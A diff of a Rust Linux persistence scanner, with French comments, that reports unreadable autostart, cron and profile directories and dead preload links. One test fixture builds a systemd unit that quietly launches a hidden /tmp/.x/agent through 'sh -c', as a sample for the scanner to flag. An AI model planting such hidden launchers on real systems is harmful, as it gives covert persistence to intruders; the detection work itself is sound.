@@ -942,15 +942,22 @@ fn nomme_prechargement(ligne: &str) -> bool {
 /// un fichier compris ; les liens d'activation (dossiers « *.wants ») ne sont pas parcourus. Un dossier « *.d » qui est
 /// un lien vers un dossier se suit, comme systemd le suit (relecture adverse, C4 ; `liens_d_ajouts` le signale).
 pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
-    fichiers_et_liens(dossier, extensions, &mut Vec::new())
+    fichiers_et_liens(dossier, extensions, &mut Vec::new(), &mut Vec::new())
 }
 
-/// `fichiers_de`, et dans `liens` les dossiers « *.d » suivis qui sont des liens vers un dossier : un tel lien posé
+/// `fichiers_de`, et dans `illisibles` les dossiers présents qui ne s'ouvrent pas (`Parcours::illisibles`) : pour
+/// les lancements, où un dossier fermé n'est jamais « rien de suspect » (ronde 4 du lot 096, G5-3).
+fn fichiers_dits(dossier: &Path, extensions: &[&str], illisibles: &mut Vec<Illisible>) -> Vec<std::path::PathBuf> {
+    fichiers_et_liens(dossier, extensions, &mut Vec::new(), illisibles)
+}
+
+/// `fichiers_dits`, et dans `liens` les dossiers « *.d » suivis qui sont des liens vers un dossier : un tel lien posé
 /// par le compte est déjà un indice (relecture adverse, C4).
 fn fichiers_et_liens(
     dossier: &Path,
     extensions: &[&str],
     liens: &mut Vec<std::path::PathBuf>,
+    illisibles: &mut Vec<Illisible>,
 ) -> Vec<std::path::PathBuf> {
     let mut trouve = Vec::new();
     let mut parcours = Parcours::default();
@@ -963,8 +970,12 @@ fn fichiers_et_liens(
         &mut parcours,
     );
     liens.append(&mut parcours.liens);
+    illisibles.append(&mut parcours.illisibles);
     trouve
 }
+
+/// Un dossier présent qui ne s'ouvre pas, et la raison du système.
+type Illisible = (std::path::PathBuf, std::io::Error);
 
 /// Les fichiers d'un dossier de modules de Hyprland (~/.config/hypr, ou un dossier de modules d'Omarchy), à toute
 /// profondeur, et dans `parcours` ce qui s'y lit mal : un sous-dossier qui est un lien vers un dossier (suivi), un
@@ -988,6 +999,10 @@ struct Parcours {
     liens_hypr: Vec<std::path::PathBuf>,
     /// Les dossiers non parcourus, au-delà de `PROFONDEUR_MAX` niveaux : ce qu'ils lancent n'est pas vérifié.
     trop_profonds: Vec<std::path::PathBuf>,
+    /// Les dossiers présents qui ne s'ouvrent pas (droits, boucle de liens, disque), et les liens d'un nom cherché dont
+    /// la cible ne se voit pas : ce qu'ils lancent n'est pas vu. Absent, ou un fichier à la place d'un dossier du
+    /// chemin, rien ne s'y lit ni ne s'y lance : rien à dire.
+    illisibles: Vec<Illisible>,
 }
 
 /// Le nom du fichier finit par « `.<ext>` », même réduit à lui (vérification 3, H1) : le `find -name '*.lua'` de
@@ -1014,11 +1029,48 @@ fn fichiers_sous(
     // Dans l'ordre des noms, pas dans celui que rend le système de fichiers (l'ordre de création sur btrfs, celui
     // d'un hachage sur ext4) : le premier refus d'une alerte l'emporte (`Temoins::de`), et le verdict d'une même
     // maison changeait selon le disque où elle était (vérification 4, D1).
-    let mut entrees: Vec<std::fs::DirEntry> = std::fs::read_dir(dossier).into_iter().flatten().flatten().collect();
+    // Un dossier qui ne s'ouvre pas est noté : avant, il rendait une liste vide, et un /etc/profile.d en 000 laissait
+    // le bilan vert (ronde 4 du lot 096, G5-3).
+    let lus = match std::fs::read_dir(dossier) {
+        Ok(lus) => lus,
+        Err(e) if absent_ou_impossible(&e) => return,
+        Err(e) => {
+            parcours.illisibles.push((dossier.to_path_buf(), e));
+            return;
+        }
+    };
+    // Une entrée que le système ne rend pas, ou dont il ne dit pas la sorte, n'est pas vue : c'est dit, comme un
+    // dossier fermé (ronde 4 du lot 096, R4-5). Disparue entre-temps, il n'y a plus rien à lire.
+    let mut entrees: Vec<std::fs::DirEntry> = Vec::new();
+    for lue in lus {
+        match lue {
+            Ok(e) => entrees.push(e),
+            Err(e) => parcours.illisibles.push((dossier.to_path_buf(), e)),
+        }
+    }
     entrees.sort_by_key(std::fs::DirEntry::file_name);
     for e in entrees {
         let p = e.path();
-        let Ok(t) = e.file_type() else { continue };
+        let t = match e.file_type() {
+            Ok(t) => t,
+            Err(erreur) if absent_ou_impossible(&erreur) => continue,
+            Err(erreur) => {
+                parcours.illisibles.push((p, erreur));
+                continue;
+            }
+        };
+        // Un lien d'un nom cherché dont la cible ne se voit pas (un dossier fermé sur son chemin, une boucle) : systemd
+        // ou le shell, en root, le suivent ; ici, rien ne s'en lit. Il est dit (`dossier_non_lu`), jamais sauté sans
+        // un mot (ronde 4 du lot 096, R4-5). Un lien mort (cible absente) ne lance rien.
+        if t.is_symlink()
+            && (a_l_extension(&p, "d") || extensions.iter().any(|x| a_l_extension(&p, x)))
+            && let Err(erreur) = std::fs::metadata(&p)
+        {
+            if !absent_ou_impossible(&erreur) {
+                parcours.illisibles.push((p, erreur));
+            }
+            continue;
+        }
         // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
         // une autre sortirait de la lecture (et son alerte avec). Un lien vers un dossier, seulement « *.d » (ou
         // sous Hyprland, où Lua le suit) et à profondeur bornée (une boucle s'arrête là, dite).
@@ -1501,7 +1553,10 @@ pub(super) fn persistance_dans(
             ),
         );
     }
-    let (sortes, mut illisibles, caches_d_uwsm) = fichiers_de_configuration(&t.r);
+    let (sortes, mut illisibles, caches_d_uwsm, non_lus) = fichiers_de_configuration(&t.r);
+    for (d, e) in &non_lus {
+        dossier_non_lu(&mut t, d, e);
+    }
     // N-1 : les fichiers de session dont un DesktopNames mène uwsm hors des fichiers lus ; ce qui ne se lit pas aussi.
     let bureaux = bureaux_a_dire(&t.r, &mut illisibles);
     // V3-1, R4-1 à R4-4 : les fichiers d'uwsm (et ce qu'ils incluent) qui changent ce qu'uwsm lit ensuite.
@@ -1971,6 +2026,9 @@ fn juger_parcours(
     masques: &[std::path::PathBuf],
     copies: &[(std::path::PathBuf, std::path::PathBuf)],
 ) {
+    for (d, e) in &parcours.illisibles {
+        dossier_non_lu(t, d, e);
+    }
     for lien in &parcours.liens_hypr {
         let montre = crate::ui::affichable(&t.r.montre(lien));
         let vers = std::fs::read_link(lien).map_or_else(
@@ -2047,6 +2105,10 @@ struct Lancements {
     /// Une ligne signalée lue avec pertes (octet hors UTF-8) : un geste ne la désigne pas (le fils root la cherche
     /// par l'empreinte de ses octets, que la ligne lue n'a plus), elle reste à la main et c'est dit (lot 096, N4).
     hors_utf8: bool,
+    /// Une ligne signalée qui finit par « \ », ou suit une telle ligne, ou, dans un fichier lu par un shell, fait partie
+    /// d'une construction sur plusieurs lignes : la retirer seule changerait le sens d'une autre ligne (ronde 4 du lot
+    /// 096, G34-1 et R4-3 : `linux::retrait_decoupe`). Un geste ne la désigne pas, et c'est dit.
+    jointes: bool,
     r: Releveur,
 }
 
@@ -2592,15 +2654,29 @@ fn raison_illisible(e: &std::io::Error) -> String {
 /// Un fichier de démarrage ou de configuration présent qui ne se lit pas (`e`) : absent, rien à dire ; sinon levé
 /// (`non_lu`), ou, s'il est à root seul, une information (comme `popt_non_lu`, V-8 : un /etc/crontab en 600, durci
 /// exprès, n'est pas un lancement suspect, mais ce qu'il lance n'est pas vu et c'est dit).
+///
+/// Ronde 4 du lot 096 (G5-1) : ce dont rien ne peut se lancer ni se poser n'est pas levé. Un chemin impossible (un
+/// fichier à la place d'un dossier du chemin, ENOTDIR) est absent ; un lien vers /dev/null est un fichier masqué,
+/// vide par construction (comme pour une unité ou un ajout masqué) ; un dossier à la place du fichier ne se lit pas
+/// comme un script : une information, jamais tue. Les droits refusés, une boucle de liens, un disque qui rate : levés,
+/// sauf à root seul.
 fn illisible(f: &Path, h: &Path, t: &mut Lancements, e: &std::io::Error) {
-    if e.kind() == std::io::ErrorKind::NotFound {
+    if absent_ou_impossible(e) || std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
         return;
     }
     let raison = raison_illisible(e);
+    if std::fs::metadata(f).is_ok_and(|m| m.is_dir()) {
+        t.informations.push(trf!(
+            "{} : un dossier à la place du fichier, rien ne s'y lit",
+            "{}: a folder instead of the file, nothing is read there",
+            court(f, h)
+        ));
+        return;
+    }
     if de_root_seul(f) {
         t.informations.push(trf!(
-            "{} : {raison}, à root seul : ce qu'il lance n'est pas vu",
-            "{}: {raison}, root-only: what it starts is not seen",
+            "{} : {raison}, à root seul : ce qu'il pose ou lance n'est pas vu",
+            "{}: {raison}, root-only: what it sets or starts is not seen",
             court(f, h)
         ));
     } else {
@@ -2608,14 +2684,46 @@ fn illisible(f: &Path, h: &Path, t: &mut Lancements, e: &std::io::Error) {
     }
 }
 
-/// Un fichier de démarrage ou de configuration qui ne se lit pas en entier : une ligne de l'alerte.
+/// Rien ne se trouve à ce chemin : absent, ou un fichier à la place d'un des dossiers du chemin (ENOTDIR). Ni le
+/// shell, ni cron, ni systemd n'y lisent rien.
+fn absent_ou_impossible(e: &std::io::Error) -> bool {
+    matches!(
+        e.kind(),
+        std::io::ErrorKind::NotFound | std::io::ErrorKind::NotADirectory
+    )
+}
+
+/// Un dossier de démarrage ou de configuration présent qui ne s'ouvre pas (`e`), avec la règle d'`illisible` : à root
+/// seul, une information (un /etc/cron.d en 700, durci exprès, n'est pas un lancement suspect) ; sinon levé
+/// (`dossier_illisible`), une seule fois s'il l'est déjà (dossiers de la maison, de la session). Ronde 4 du lot 096
+/// (G5-3) : avant, /etc/cron.d ou /etc/profile.d en 000 rendaient une liste vide, et le bilan restait vert.
+fn dossier_non_lu(t: &mut Lancements, d: &Path, e: &std::io::Error) {
+    if absent_ou_impossible(e) {
+        return;
+    }
+    if de_root_seul(d) {
+        let raison = raison_illisible(e);
+        t.informations.push(trf!(
+            "{} : {raison}, à root seul : ce qu'il pose ou lance n'est pas vu",
+            "{}: {raison}, root-only: what it sets or starts is not seen",
+            crate::ui::affichable(&t.r.montre(d))
+        ));
+        return;
+    }
+    let source = source_de("maison", &format!("illisible {}", t.r.montre(d)));
+    if !t.sources.contains(&source) {
+        dossier_illisible(t, d, e);
+    }
+}
+
+/// Un fichier de démarrage ou de configuration qui ne se lit pas, ou pas en entier : une ligne de l'alerte.
 fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
     t.sources
         .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), "non lu"));
     t.retraits.push(None);
     t.temoins.push(Err(temoins::Refus(trf!(
-        "{} ne se lit pas en entier",
-        "{} cannot be read in full",
+        "{} ne se lit pas",
+        "{} cannot be read",
         court(f, h)
     ))));
     t.suspects.push(trf!(
@@ -3908,7 +4016,8 @@ impl Codes {
 /// Les variables qu'une unité (`texte`) pose à ses lignes Exec, ajoutées à `variables` : « Environment= » et
 /// « EnvironmentFile= » de ses seules sections `[Service]` et `[Socket]` (vérification 3, P2 : ailleurs, systemd les
 /// ignore), leurs codes « % » développés. Une variable posée à deux valeurs différentes (unité et ajouts, ou fichier
-/// de variables) vaut `CODE_INCONNU` : ce qu'elle lance ne se connaît pas sans l'ordre exact de systemd.
+/// de variables) vaut `CODE_INCONNU` : ce qu'elle lance ne se connaît pas sans l'ordre exact de systemd. D'un
+/// fichier de variables, seule la valeur que systemd pose compte (`permise::lire_variables_posees`, G5-2).
 fn variables_d_unite(
     texte: &str,
     codes: &Codes,
@@ -3948,7 +4057,7 @@ fn variables_d_unite(
             "EnvironmentFile" => {
                 let chemin = valeur.strip_prefix('-').unwrap_or(&valeur);
                 if chemin.starts_with('/')
-                    && let Ok(lues) = permise::lire_variables(&r.sous(Path::new(chemin)))
+                    && let Ok(lues) = permise::lire_variables_posees(&r.sous(Path::new(chemin)))
                 {
                     for (nom, v) in lues {
                         poser(&nom, v);
@@ -7004,11 +7113,25 @@ fn telle_qu_ecrite(texte: &str, l: &str) -> String {
 }
 
 /// Le fichier et la ligne à retirer, pour `Lancements::retraits` ; `None` (à la main) pour une ligne qu'un geste ne
-/// désigne pas, hors UTF-8 (`Lancements::hors_utf8`).
+/// désigne pas : hors UTF-8 (`Lancements::hors_utf8`), ou liée à une autre (`Lancements::jointes`, même règle que le
+/// fils root : `linux::retrait_decoupe`) par un « \ » final, la sienne ou celle d'avant, ou, dans un fichier lu par un
+/// shell, par un guillemet, un heredoc, un bloc ou une suite par « | » ou « && ».
 fn retrait(t: &mut Lancements, f: &Path, lu: &Lecture, l: &str) -> Option<(String, String)> {
     let ecrite = telle_qu_ecrite(&lu.texte, l);
     if !lu.designable(&ecrite) {
         t.hors_utf8 = true;
+        return None;
+    }
+    // Chaque ligne écrite pareille : le fils root les retire toutes.
+    let numeros: Vec<usize> = lu
+        .octets
+        .split(|o| *o == b'\n')
+        .enumerate()
+        .filter(|(_, e)| *e == ecrite.as_bytes())
+        .map(|(n, _)| n)
+        .collect();
+    if crate::machine::linux::retrait_decoupe(&f.to_string_lossy(), &lu.octets, &numeros).is_some() {
+        t.jointes = true;
         return None;
     }
     Some((f.to_str()?.to_string(), ecrite))
@@ -7028,10 +7151,12 @@ fn lire_prechargement(
     let h = t.r.maison.clone();
     // Présent mais illisible, il est levé même à root seul (N5) : le chargeur le lit pour chaque programme, et un
     // fichier que le compte ne lit pas se charge encore dans les programmes de root. Sur un système sain, il est
-    // lisible par tous, ou absent ; l'avis du démarrage dit la même chose (`protection::environnement`).
+    // lisible par tous, ou absent ; l'avis du démarrage le dit aussi, avec la même raison, mais en MOYEN
+    // (`protection::environnement`). Un lien vers une cible absente n'est pas « absent » (ronde 4 du lot 096, G5-5).
     let illisible = |t: &mut Lancements, e: &std::io::Error| {
+        let e = temoins::sauf_lien_mort(&preload, std::io::Error::new(e.kind(), e.to_string()));
         if e.kind() != std::io::ErrorKind::NotFound {
-            non_lu(&preload, &h, t, &raison_illisible(e));
+            non_lu(&preload, &h, t, &raison_illisible(&e));
         }
     };
     if let Some(lu) = lire_sinon(&preload, &h, t, illisible) {
@@ -7103,7 +7228,8 @@ fn lire_prechargement(
 
 /// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte,
 /// chacun avec sa sorte, qui vient du lieu où il est trouvé (X-1) ; et les dossiers où leurs lecteurs cherchent qui
-/// ne se lisent pas, que le bilan ne dit pas déjà (S-3).
+/// ne se lisent pas, que le bilan ne dit pas déjà (S-3) ; et les dossiers présents qui ne s'ouvrent pas
+/// (`Parcours::illisibles`), à dire (ronde 4 du lot 096, G5-3).
 /// Les fichiers de configuration à juger (fichier, sorte), les dossiers et fichiers qui ne se lisent pas, et (N8-2)
 /// les fichiers cachés des « .d » d'uwsm, jugés à part pour lever seulement (`juger_caches_d_uwsm`).
 #[allow(clippy::type_complexity)]
@@ -7113,7 +7239,9 @@ fn fichiers_de_configuration(
     Vec<(std::path::PathBuf, Variables)>,
     Vec<std::path::PathBuf>,
     Vec<std::path::PathBuf>,
+    Vec<Illisible>,
 ) {
+    let mut non_lus = Vec::new();
     let h = &r.maison;
     let etc = |chemin: &str| r.racine.join(chemin);
     let shell = |f: std::path::PathBuf| (f, Variables::Shell);
@@ -7134,12 +7262,20 @@ fn fichiers_de_configuration(
         .map(|c| shell(etc(c))),
     );
     configuration.extend(
-        fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"])
+        fichiers_dits(&etc("etc/profile.d"), &["sh", "zsh"], &mut non_lus)
             .into_iter()
             .map(shell),
     );
-    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]).into_iter().map(cles));
-    configuration.extend(fichiers_de(&etc("etc/fish/conf.d"), &["fish"]).into_iter().map(shell));
+    configuration.extend(
+        fichiers_dits(&etc("etc/environment.d"), &["conf"], &mut non_lus)
+            .into_iter()
+            .map(cles),
+    );
+    configuration.extend(
+        fichiers_dits(&etc("etc/fish/conf.d"), &["fish"], &mut non_lus)
+            .into_iter()
+            .map(shell),
+    );
     // ~/.bash_login, ~/.zlogin et fish aussi (vérification de la campagne E) : chacun lit du code à l'ouverture.
     configuration.extend(
         [
@@ -7161,7 +7297,7 @@ fn fichiers_de_configuration(
         .map(|f| shell(h.join(f))),
     );
     configuration.extend(
-        fichiers_de(&h.join(".config/fish/conf.d"), &["fish"])
+        fichiers_dits(&h.join(".config/fish/conf.d"), &["fish"], &mut non_lus)
             .into_iter()
             .map(shell),
     );
@@ -7173,31 +7309,31 @@ fn fichiers_de_configuration(
     if let Some(c) = &r.config {
         configuration.push(shell(r.sous(&c.join("fish/config.fish"))));
         configuration.extend(
-            fichiers_de(&r.sous(&c.join("fish/conf.d")), &["fish"])
+            fichiers_dits(&r.sous(&c.join("fish/conf.d")), &["fish"], &mut non_lus)
                 .into_iter()
                 .map(shell),
         );
     }
     configuration.extend(
-        fichiers_de(&h.join(".config/environment.d"), &["conf"])
+        fichiers_dits(&h.join(".config/environment.d"), &["conf"], &mut non_lus)
             .into_iter()
             .map(cles),
     );
     // L'environnement que le gestionnaire de systemd du compte donne à chaque unité (relecture adverse 2, N8).
     configuration.push(systemd(etc("etc/systemd/user.conf")));
     configuration.extend(
-        fichiers_de(&etc("etc/systemd/user.conf.d"), &["conf"])
+        fichiers_dits(&etc("etc/systemd/user.conf.d"), &["conf"], &mut non_lus)
             .into_iter()
             .map(systemd),
     );
     configuration.push(systemd(h.join(".config/systemd/user.conf")));
     configuration.extend(
-        fichiers_de(&h.join(".config/systemd/user.conf.d"), &["conf"])
+        fichiers_dits(&h.join(".config/systemd/user.conf.d"), &["conf"], &mut non_lus)
             .into_iter()
             .map(systemd),
     );
     configuration.extend(
-        fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"])
+        fichiers_dits(&h.join(".config/uwsm"), &["sh", "conf"], &mut non_lus)
             .into_iter()
             .map(shell),
     );
@@ -7278,7 +7414,7 @@ fn fichiers_de_configuration(
     illisibles.sort();
     illisibles.dedup();
     caches.retain(|f| !configuration.iter().any(|(c, _)| c == f));
-    (configuration, illisibles, caches)
+    (configuration, illisibles, caches, non_lus)
 }
 
 /// W-6 : un fichier ordinaire (lien suivi) que ce compte ne peut pas ouvrir en lecture, ou dont la nature ne se lit
@@ -7531,7 +7667,8 @@ struct Demarrage {
     hypr: Vec<std::path::PathBuf>,
     /// Les dossiers « *.d » d'unités qui sont des liens vers un dossier (relecture adverse, C4).
     liens: Vec<std::path::PathBuf>,
-    /// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (liens, profondeur).
+    /// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (liens, profondeur), et les dossiers
+    /// lus qui ne s'ouvrent pas.
     parcours: Parcours,
     /// Les modules Lua d'Omarchy lus hors de ~/.config/hypr.
     modules: Vec<std::path::PathBuf>,
@@ -7577,10 +7714,12 @@ fn fichiers_de_demarrage(r: &Releveur) -> Demarrage {
     let etc = |chemin: &str| r.racine.join(chemin);
     let mut demarrage = Vec::new();
     let mut liens = Vec::new();
+    let mut parcours = Parcours::default();
+    let mut illisibles = Vec::new();
     // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
     // unités lues ailleurs.
     for d in ["etc/systemd/system", "etc/systemd/user"] {
-        let mut unites = fichiers_et_liens(&etc(d), &UNITES, &mut liens);
+        let mut unites = fichiers_et_liens(&etc(d), &UNITES, &mut liens, &mut illisibles);
         unites.retain(|p| !p.is_symlink());
         demarrage.extend(unites);
     }
@@ -7590,41 +7729,63 @@ fn fichiers_de_demarrage(r: &Releveur) -> Demarrage {
         ".config/systemd/user.control",
         ".local/share/systemd/user",
     ] {
-        demarrage.extend(fichiers_et_liens(&h.join(d), &UNITES, &mut liens));
+        demarrage.extend(fichiers_et_liens(&h.join(d), &UNITES, &mut liens, &mut illisibles));
     }
-    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
-    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
-    let mut parcours = Parcours::default();
+    demarrage.extend(fichiers_dits(
+        &h.join(".config/autostart"),
+        &["desktop"],
+        &mut illisibles,
+    ));
+    demarrage.extend(fichiers_dits(&etc("etc/xdg/autostart"), &["desktop"], &mut illisibles));
     let mut hypr = fichiers_de_hypr(&h.join(".config/hypr"), &mut parcours);
     // XDG_CONFIG_HOME et XDG_DATA_HOME déplacés : systemd et Hyprland y lisent aussi (vérification de la campagne E,
     // N7 ; M-d ne couvrait que le suivi d'une unité déjà acceptée).
     if let Some(c) = &r.config {
         for d in ["systemd/user", "systemd/user.control"] {
-            demarrage.extend(fichiers_et_liens(&r.sous(&c.join(d)), &UNITES, &mut liens));
+            demarrage.extend(fichiers_et_liens(
+                &r.sous(&c.join(d)),
+                &UNITES,
+                &mut liens,
+                &mut illisibles,
+            ));
         }
-        demarrage.extend(fichiers_de(&r.sous(&c.join("autostart")), &["desktop"]));
+        demarrage.extend(fichiers_dits(
+            &r.sous(&c.join("autostart")),
+            &["desktop"],
+            &mut illisibles,
+        ));
         hypr.extend(fichiers_de_hypr(&r.sous(&c.join("hypr")), &mut parcours));
     }
     if let Some(d) = &r.donnees {
-        demarrage.extend(fichiers_et_liens(&r.sous(&d.join("systemd/user")), &UNITES, &mut liens));
+        demarrage.extend(fichiers_et_liens(
+            &r.sous(&d.join("systemd/user")),
+            &UNITES,
+            &mut liens,
+            &mut illisibles,
+        ));
     }
     // Les services D-Bus de la session que le compte écrit : leur « Exec= » se lit comme une ligne d'unité, plus
     // stricte que le bus (ni code « % » ni variable chez lui : un tel mot est levé, jamais tu).
     for d in r.dossiers_dbus() {
-        demarrage.extend(fichiers_de(d, &["service"]));
+        demarrage.extend(fichiers_dits(d, &["service"], &mut illisibles));
     }
     // Le dossier de la session : systemd y lit des unités de l'utilisateur (« systemctl --user --runtime », celles de
     // « systemd-run --user » dans transient/, celles des générateurs). Effacées à l'arrêt, elles lancent quand même
     // des programmes pendant la session : jugées par leur contenu, comme les autres (`Ajout::Session`).
     if let Some(s) = &r.session {
         for d in DOSSIERS_DE_LA_SESSION {
-            demarrage.extend(fichiers_et_liens(&r.sous(&s.join(d)), &UNITES, &mut liens));
+            demarrage.extend(fichiers_et_liens(
+                &r.sous(&s.join(d)),
+                &UNITES,
+                &mut liens,
+                &mut illisibles,
+            ));
         }
     }
     // Les dossiers que systemd lit en plus des habituels (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, le dossier de
     // session de systemd quand XDG_RUNTIME_DIR mène ailleurs) : `Ajout::Dossier`.
     for d in &r.dossiers_ajoutes {
-        demarrage.extend(fichiers_et_liens(d, &UNITES, &mut liens));
+        demarrage.extend(fichiers_et_liens(d, &UNITES, &mut liens, &mut illisibles));
     }
     // Les modules d'Omarchy hors de ~/.config/hypr (deuxième vérification, N11) : leurs seuls fichiers Lua, à toute
     // profondeur, liens suivis et dits ; sous un XDG_STATE_HOME déplacé aussi (workspace-layouts.lua l'ajoute).
@@ -7661,6 +7822,8 @@ fn fichiers_de_demarrage(r: &Releveur) -> Demarrage {
         .retain(|l| modules.iter().any(|m| m.starts_with(l)));
     parcours.liens_hypr.append(&mut des_modules.liens_hypr);
     parcours.trop_profonds.append(&mut des_modules.trop_profonds);
+    parcours.illisibles.append(&mut illisibles);
+    parcours.illisibles.append(&mut des_modules.illisibles);
     // Le moteur de dictée choisi (vérification 3, H3) : dictation-backend.lua d'Omarchy fait « dofile » de
     // <config>/<moteur>/shortcuts.lua, le moteur lu à la 1re ligne de <config>/omarchy/defaults/dictation.
     let mut configs = vec![h.join(".config")];
@@ -13607,13 +13770,20 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
         }
     }
     let mut fichiers_cron = vec![etc("etc/crontab")];
-    fichiers_cron.extend(
-        std::fs::read_dir(etc("etc/cron.d"))
-            .into_iter()
-            .flatten()
-            .flatten()
-            .map(|e| e.path()),
-    );
+    // Un /etc/cron.d qui ne s'ouvre pas est dit (ronde 4 du lot 096, G5-3) ; un sous-dossier, que cron ne lit pas
+    // (cronie : fichiers ordinaires seulement), n'est pas un fichier illisible (G5-1).
+    match std::fs::read_dir(etc("etc/cron.d")) {
+        Ok(lus) => {
+            let mut lus: Vec<std::path::PathBuf> = lus
+                .flatten()
+                .map(|e| e.path())
+                .filter(|p| !std::fs::metadata(p).is_ok_and(|m| m.is_dir()))
+                .collect();
+            lus.sort();
+            fichiers_cron.extend(lus);
+        }
+        Err(e) => dossier_non_lu(t, &etc("etc/cron.d"), &e),
+    }
     let h = t.r.maison.clone();
     for f in fichiers_cron {
         let Some(lu) = lire(&f, &h, t) else {
@@ -13765,6 +13935,7 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         mut informations,
         mut notes,
         hors_utf8,
+        jointes,
         ..
     } = t;
     suspects.sort();
@@ -13823,6 +13994,12 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         message.push_str(tr!(
             " Une ligne signalée n'est pas du texte UTF-8 : un geste ne peut pas la désigner, tout est à retirer à la main.",
             " A reported line is not UTF-8 text: no action can point at it, everything is to be removed by hand."
+        ));
+    }
+    if jointes {
+        message.push_str(tr!(
+            " Une ligne signalée finit par « \\ », ou suit une telle ligne, ou fait partie d'une construction du shell sur plusieurs lignes (guillemet ouvert, heredoc, bloc, suite par « | » ou « && ») : la retirer seule changerait le sens d'une autre ligne ; tout est à corriger à la main.",
+            " A reported line ends with \"\\\", or follows such a line, or is part of a shell construct spanning several lines (open quote, heredoc, block, continuation with \"|\" or \"&&\"): removing it alone would change what another line does; everything is to be fixed by hand."
         ));
     }
     if let Some(a) = a_savoir {
@@ -19500,6 +19677,37 @@ mod tests {
         }
     }
 
+    /// Ronde 4 du lot 096 (G5-2, R3-G1-2) : une valeur saine écrite avec un « \ » ou des guillemets collés, dans un
+    /// « EnvironmentFile= », se développe dans la ligne Exec avec la valeur que systemd pose (forme défaite) : la
+    /// forme brute, gardée pour le juge, n'en fait plus une variable inconnue (ligne « non lue », ÉLEVÉ). Témoin : la
+    /// même lecture développe aussi ce qui lance un programme caché, toujours levé.
+    #[test]
+    fn valeur_echappee_se_developpe_comme_systemd() {
+        for (i, (variables, exec, piege)) in [
+            ("OPTS=--nom=Mon\\ Serveur\n", "/usr/bin/sleep $OPTS", false),
+            ("OPTS=\"-a\" '-b'\n", "/usr/bin/sleep $OPTS", false),
+            ("CHEMIN=/srv/mes\\ donnees\n", "/usr/bin/ls ${CHEMIN}", false),
+            ("OPTS=\"--motd=\\\"Bonjour\\\"\"\n", "/usr/bin/sleep $OPTS", false),
+            ("CMD=/tmp/.x/agent\\ --x\n", "/bin/sh -c ${CMD}", true),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("env-echappee-{i}"));
+            m.ecrire(
+                ".config/systemd/user/a.service",
+                &format!("[Service]\nEnvironmentFile=/etc/rappel-env\nExecStart={exec}\n"),
+            );
+            m.ecrire_hors("/etc/rappel-env", variables);
+            let c = m.lancements();
+            if piege {
+                leve(&c, variables);
+            } else {
+                assert_eq!(c.probleme, None, "{variables:?} : {}", c.message);
+            }
+        }
+    }
+
     /// Ronde 3 du lot 096 (N6) : un nom de /etc/ld.so.preload fini par « \r » (ligne en « \r\n ») est demandé TEL
     /// QUEL à la base des paquets : c'est ce fichier-là, « \r » compris, que le chargeur ouvre ; la base ne connaît
     /// que le nom sans « \r », donc il est « hors paquet » (correctif C2, qu'aucun essai ne tenait). La ligne à
@@ -19548,7 +19756,9 @@ mod tests {
     /// Ronde 3 du lot 096 (N5) : un /etc/ld.so.preload présent mais illisible (un dossier à sa place, une boucle de
     /// liens) n'est jamais un bilan vert : il est levé, « non vérifié », avec la raison du système, comme l'avis du
     /// démarrage le dit déjà. Avant, `lire` le sautait sans un mot : « Aucun lancement automatique suspect ».
-    /// Témoins : absent, ou lien mort (le chargeur ne lit rien), le bilan reste muet.
+    /// Témoin : absent, le bilan reste muet. Ronde 4 (G5-5) : un lien vers une cible absente n'est plus « absent » ; le
+    /// chargeur ne lit rien aujourd'hui, mais le lien attend qu'une cible soit posée (par le compte, si elle est dans
+    /// un dossier qu'il écrit) : levé, « illisible (lien vers une cible absente) ».
     #[test]
     fn preload_illisible_jamais_vert() {
         for sorte in ["dossier", "boucle", "absent", "lien mort"] {
@@ -19562,9 +19772,16 @@ mod tests {
                 _ => {}
             }
             let c = m.lancements();
-            if matches!(sorte, "absent" | "lien mort") {
+            if sorte == "absent" {
                 assert_eq!(c.probleme, None, "{sorte} : {}", c.message);
                 continue;
+            }
+            if sorte == "lien mort" {
+                assert!(
+                    c.message.contains("illisible (lien vers une cible absente)"),
+                    "{}",
+                    c.message
+                );
             }
             assert_eq!(c.probleme, Some(Niveau::Eleve), "{sorte} : {}", c.message);
             assert!(
@@ -19598,15 +19815,16 @@ mod tests {
 
     /// N5 pour tout fichier de démarrage ou de configuration lu par `lire` : présent mais illisible, il est levé au
     /// compte (« non lu ») ; à root seul, une information (V-8 : un /etc/crontab en 600, durci exprès, n'est pas un
-    /// lancement suspect) ; absent, rien. Un ~/.bashrc remplacé par un dossier, lui, lève le bilan.
+    /// lancement suspect) ; absent, rien. Ronde 4 (G5-1) : un ~/.bashrc remplacé par un dossier ne se lit pas comme un
+    /// script (bash le refuse) : une information, plus une alerte ÉLEVÉE.
     #[test]
     fn illisible_dit_selon_a_qui() {
         let m = Maison::nouvelle("bashrc-dossier");
         std::fs::create_dir_all(m.chemin(".bashrc")).unwrap();
         let c = m.lancements();
-        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert_eq!(c.probleme, Some(Niveau::Info), "{}", c.message);
         assert!(
-            c.message.contains("~/.bashrc : illisible (") && c.message.contains("non vérifié"),
+            c.message.contains("~/.bashrc : un dossier à la place du fichier"),
             "{}",
             c.message
         );
@@ -19630,6 +19848,154 @@ mod tests {
         illisible(systeme, &h, &mut t, &refus);
